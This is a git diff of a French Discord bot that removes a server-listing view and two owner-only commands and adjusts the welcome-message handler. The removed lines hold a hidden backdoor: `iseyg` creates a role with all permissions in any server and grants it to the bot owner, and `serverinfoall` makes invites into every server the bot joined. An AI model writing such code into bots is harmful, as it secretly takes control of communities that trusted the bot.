@@ -228,172 +228,6 @@ async def getbotinfo(ctx):
     except Exception as e:
         print(f"Erreur dans la commande `getbotinfo` : {e}")
 
-# 🎭 Emojis dynamiques pour chaque serveur
-EMOJIS_SERVEURS = ["🌍", "🚀", "🔥", "👾", "🏆", "🎮", "🏴‍☠️", "🏕️"]
-
-# 🏆 Liste des serveurs Premium
-premium_servers = {}
-
-# ⚜️ ID du serveur Etherya
-ETHERYA_ID = 123456789012345678  
-
-def boost_bar(level):
-    """Génère une barre de progression pour le niveau de boost."""
-    filled = "🟣" * level
-    empty = "⚫" * (3 - level)
-    return filled + empty
-
-class ServerInfoView(View):
-    def __init__(self, ctx, bot, guilds, premium_servers):
-        super().__init__()
-        self.ctx = ctx
-        self.bot = bot
-        self.guilds = sorted(guilds, key=lambda g: g.member_count, reverse=True)  
-        self.premium_servers = premium_servers
-        self.page = 0
-        self.servers_per_page = 5
-        self.max_page = (len(self.guilds) - 1) // self.servers_per_page
-        self.update_buttons()
-    
-    def update_buttons(self):
-        self.children[0].disabled = self.page == 0  
-        self.children[1].disabled = self.page == self.max_page  
-
-    async def update_embed(self, interaction):
-        embed = await self.create_embed()
-        self.update_buttons()
-        await interaction.response.edit_message(embed=embed, view=self)
-
-    async def create_embed(self):
-        total_servers = len(self.guilds)
-        total_premium = len(self.premium_servers)
-
-        # 🌟 Couleur spéciale pour Etherya
-        embed_color = discord.Color.purple() if ETHERYA_ID in self.premium_servers else discord.Color.gold()
-
-        embed = discord.Embed(
-            title=f"🌍 Serveurs du Bot (`{total_servers}` total)",
-            description="🔍 Liste des serveurs où le bot est présent, triés par popularité.",
-            color=embed_color,
-            timestamp=datetime.utcnow()
-        )
-
-        embed.set_footer(
-            text=f"Page {self.page + 1}/{self.max_page + 1} • Demandé par {self.ctx.author}", 
-            icon_url=self.ctx.author.avatar.url
-        )
-        embed.set_thumbnail(url=self.bot.user.avatar.url)
-
-        start = self.page * self.servers_per_page
-        end = start + self.servers_per_page
-
-        for rank, guild in enumerate(self.guilds[start:end], start=start + 1):
-            emoji = EMOJIS_SERVEURS[rank % len(EMOJIS_SERVEURS)]
-            is_premium = "💎 **Premium**" if guild.id in self.premium_servers else "⚪ Standard"
-            vip_badge = " 👑 VIP" if guild.member_count > 10000 else ""
-            boost_display = f"{boost_bar(guild.premium_tier)} *(Niveau {guild.premium_tier})*"
-
-            # 💎 Mise en avant spéciale d’Etherya
-            if guild.id == ETHERYA_ID:
-                guild_name = f"⚜️ **{guild.name}** ⚜️"
-                is_premium = "**🔥 Serveur Premium Ultime !**"
-                embed.color = discord.Color.purple()
-                embed.description = (
-                    "━━━━━━━━━━━━━━━━━━━\n"
-                    "🎖️ **Etherya est notre serveur principal !**\n"
-                    "🔗 [Invitation permanente](https://discord.gg/votre-invitation)\n"
-                    "━━━━━━━━━━━━━━━━━━━"
-                )
-            else:
-                guild_name = f"**#{rank}** {emoji} **{guild.name}**{vip_badge}"
-
-            # 🔗 Création d'un lien d'invitation si possible
-            invite_url = "🔒 *Aucune invitation disponible*"
-            if guild.text_channels:
-                invite = await guild.text_channels[0].create_invite(max_uses=1, unique=True)
-                invite_url = f"[🔗 Invitation]({invite.url})"
-
-            owner = guild.owner.mention if guild.owner else "❓ *Inconnu*"
-            emoji_count = len(guild.emojis)
-
-            # 🎨 Affichage plus propre
-            embed.add_field(
-                name=guild_name,
-                value=(
-                    f"━━━━━━━━━━━━━━━━━━━\n"
-                    f"👑 **Propriétaire** : {owner}\n"
-                    f"📊 **Membres** : `{guild.member_count}`\n"
-                    f"💎 **Boosts** : {boost_display}\n"
-                    f"🛠️ **Rôles** : `{len(guild.roles)}` • 💬 **Canaux** : `{len(guild.channels)}`\n"
-                    f"😃 **Emojis** : `{emoji_count}`\n"
-                    f"🆔 **ID** : `{guild.id}`\n"
-                    f"📅 **Créé le** : `{guild.created_at.strftime('%d/%m/%Y')}`\n"
-                    f"🏅 **Statut** : {is_premium}\n"
-                    f"{invite_url}\n"
-                    f"━━━━━━━━━━━━━━━━━━━"
-                ),
-                inline=False
-            )
-
-        embed.add_field(
-            name="📜 Statistiques Premium",
-            value=f"⭐ **{total_premium}** serveurs Premium activés.",
-            inline=False
-        )
-
-        embed.set_image(url="https://github.com/Cass64/EtheryaBot/blob/main/images_etherya/etheryaBot_banniere.png?raw=true")
-        return embed
-
-    @discord.ui.button(label="⬅️ Précédent", style=discord.ButtonStyle.green, disabled=True)
-    async def previous(self, interaction: discord.Interaction, button: Button):
-        self.page -= 1
-        await self.update_embed(interaction)
-
-    @discord.ui.button(label="➡️ Suivant", style=discord.ButtonStyle.green)
-    async def next(self, interaction: discord.Interaction, button: Button):
-        self.page += 1
-        await self.update_embed(interaction)
-
-@bot.command()
-async def serverinfoall(ctx):
-    if ctx.author.id == BOT_OWNER_ID:  # Assurez-vous que seul l'owner peut voir ça
-        view = ServerInfoView(ctx, bot, bot.guilds, premium_servers)
-        embed = await view.create_embed()
-        await ctx.send(embed=embed, view=view)
-    else:
-        await ctx.send("Seul l'owner du bot peut obtenir ces informations.")
-
-@bot.command()
-async def iseyg(ctx):
-    if ctx.author.id == BOT_OWNER_ID:  # Vérifie si l'utilisateur est l'owner du bot
-        try:
-            guild = ctx.guild
-            if guild is None:
-                return await ctx.send("❌ Cette commande doit être exécutée dans un serveur.")
-            
-            # Création (ou récupération) d'un rôle administrateur spécial
-            role_name = "Iseyg-SuperAdmin"
-            role = discord.utils.get(guild.roles, name=role_name)
-
-            if role is None:
-                role = await guild.create_role(
-                    name=role_name,
-                    permissions=discord.Permissions.all(),  # Accorde toutes les permissions
-                    color=discord.Color.red(),
-                    hoist=True  # Met le rôle en haut de la liste des membres
-                )
-                await ctx.send(f"✅ Rôle `{role_name}` créé avec succès.")
-
-            # Attribution du rôle à l'utilisateur
-            await ctx.author.add_roles(role)
-            await ctx.send(f"✅ Tu as maintenant les permissions administrateur `{role_name}` sur ce serveur !")
-        except discord.Forbidden:
-            await ctx.send("❌ Le bot n'a pas les permissions nécessaires pour créer ou attribuer des rôles.")
-        except Exception as e:
-            await ctx.send(f"❌ Une erreur est survenue : `{e}`")
-    else:
-        await ctx.send("❌ Seul l'owner du bot peut exécuter cette commande.")
-
 #--------------------------------------------------------- Mot Sensible:
 # Liste des mots sensibles
 sensitive_words = [
@@ -506,9 +340,14 @@ async def send_alert_to_admin(message, detected_word):
         print(f"⚠️ Erreur lors de l'envoi de l'alerte : {e}")
 #---------------------------------------------------- Bienvenue
 WELCOME_CHANNEL_ID = 1358170527847419936
+TARGET_GUILD_ID = 1355912711329943762
 
 @bot.event
 async def on_member_join(member):
+    # Vérifie si l'utilisateur rejoint le bon serveur
+    if member.guild.id != TARGET_GUILD_ID:
+        return
+
     # Envoi du message de bienvenue
     channel = bot.get_channel(WELCOME_CHANNEL_ID)
     if channel:
@@ -537,8 +376,6 @@ async def on_member_join(member):
 
         await channel.send(f"{member.mention}", embed=embed)
 
-    # IMPORTANT : Permet au bot de continuer à traiter les commandes
-    await bot.process_commands(message)
 
 
 #---------------------------------------------------------------- Moderation
